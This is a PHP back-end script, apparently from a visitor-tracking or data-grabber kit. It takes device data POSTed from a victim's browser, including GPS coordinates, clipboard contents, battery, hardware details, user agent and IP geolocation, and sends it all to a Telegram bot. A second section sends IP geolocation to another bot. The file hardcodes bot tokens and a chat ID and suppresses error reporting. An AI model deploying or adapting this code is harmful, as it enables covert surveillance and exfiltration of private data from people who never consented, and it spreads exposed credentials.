<?php
error_reporting(0);
$networkinfo = $_POST['networkinformation'];
$batterypercentage = $_POST['batterypercentage'];
$ischarging = $_POST['ischarging'];
$width = $_POST['width'];
$height = $_POST['height'];
$platform = $_POST['platform'];
$gps = $_POST['gps'];
$localtime = $_POST['localtime'];

$devicelang = $_POST['devicelang'];
$iscookieEnabled = $_POST['iscookieEnabled'];
$useragent = $_POST['useragent'];
$deviceram = $_POST['deviceram'];
$cpuThreads = $_POST['cpuThreads'];
$referurl = $_POST['referurl'];
$clipboard = $_POST['clipboard'];
$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
date_default_timezone_set('Europe/Istanbul');
$tarih=date("d-m-Y H:i:s");

   
$token = "6134286704:AAHwY_KQzUsrvMAo7FH2MEL8fGc6pba26Hg"; 
$chat_id = "2041536580";
$txt = urlencode("Networkinformation:{$networkinfo}\nBattry:{$batterypercentage}\nCharging:{$ischarging}\nScreen Width:{$width}\nScreen Height:{$height}\nPlatform:{$platform}\nGps:{$gps}\nLocaltime:{$localtime}\nDevice Language:{$devicelang}\nUseragent:{$useragent}\nDeviceram:{$deviceram}\nCPU Threads:{$cpuThreads}\nReferurl:{$referurl}\nCookie Enabled:{$iscookieEnabled}\nClipboard:{$clipboard}\nIP:{$ip}\nIP country:{$ulke}\nUTC date and time:{$tarih}\nLocal date:{$currentDate}\nCookie Enabled:{$iscookieEnabled}");
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


// PHP code (send_ip.php)

// Get the IP address from the request
$ipAddress = $_POST['ipAddress'];

// Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
$botToken = '6002701289:AAFzBkmBuaoW382T4e3HzJjHbrXd6aEt5mQ';

// Replace 'YOUR_CHAT_ID' with your actual Telegram chat ID
$chatID = '2041536580';

// Send the IP address to the Telegram bot
$telegramURL = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
//$message = "IP Address: " . $ipAddress;

$message = json_decode(file_get_contents("http://ip-api.com/json/{$ipAddress}"));

$telegramData = array(
  'chat_id' => $chatID,
  'text' => $message
);

$curl = curl_init($telegramURL);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $telegramData);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($curl);
curl_close($curl);

?>